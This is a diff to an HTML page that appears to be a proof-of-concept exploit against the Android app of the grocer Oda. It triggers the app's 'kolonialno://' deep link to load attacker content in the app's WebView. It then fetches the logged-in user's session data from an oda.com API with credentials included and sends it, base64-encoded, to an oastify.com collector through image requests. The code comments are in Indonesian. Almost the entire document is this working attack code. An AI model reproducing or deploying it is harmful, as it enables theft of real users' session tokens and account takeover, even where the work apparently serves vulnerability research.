@@ -1,13 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+
 <script>
-   // The goal is to hit the 'external-webview' deep link path directly 
-   // bypasses the standard HTTPS resolution and forces a WebView screen.
-   var payloadUrl = "https://st-mudo.github.io/webview-poc/trigger_bridge.html";
+// logger ke burp
+function log(msg){
+    new Image().src = "https://2mp456d5wau58jufmsh3835ac1iv6yun.oastify.com/?log=" + msg;
+}
 
-   // Method A: Deep Link Path Injection
-   var intentA = "kolonialno://?data=" + encodeURIComponent(payloadUrl) + "#Intent;scheme=kolonialno;package=no.kolonial.tienda;end";
+// STEP 1: redirect ke app dengan payload kita
+window.location.href = "kolonialno://?data=https://st-mudo.github.io/index.html#exploit";
 
-   // Method B: Intent Extra Injection (Backup)
-   var intentB = "intent:#Intent;action=android.intent.action.VIEW;package=no.kolonial.tienda;S.url=" + payloadUrl + ";S.title=Oda%20Support;end";
+// fallback kalau tidak kebuka app
+setTimeout(()=>{
+    log("OPENED_IN_BROWSER");
+}, 4000);
 
-   window.location.href = intentA;
+// ===============================
+// STEP 2: payload otomatis jalan saat dibuka di WebView
+// ===============================
+if (window.location.hash === "#exploit") {
+
+    log("INSIDE_WEBVIEW");
+
+    // ambil data user
+    fetch("https://oda.com/api/v1/user/refresh/", {
+        credentials: "include"
+    })
+    .then(r => r.text())
+    .then(d => {
+
+        // exfiltrate via image (no CORS issue)
+        new Image().src = "https://2mp456d5wau58jufmsh3835ac1iv6yun.oastify.com/?data=" + btoa(d);
+
+    })
+    .catch(e => {
+        new Image().src = "https://2mp456d5wau58jufmsh3835ac1iv6yun.oastify.com/?error=" + e;
+    });
+
+}
 </script>
+
+</body>
+</html>
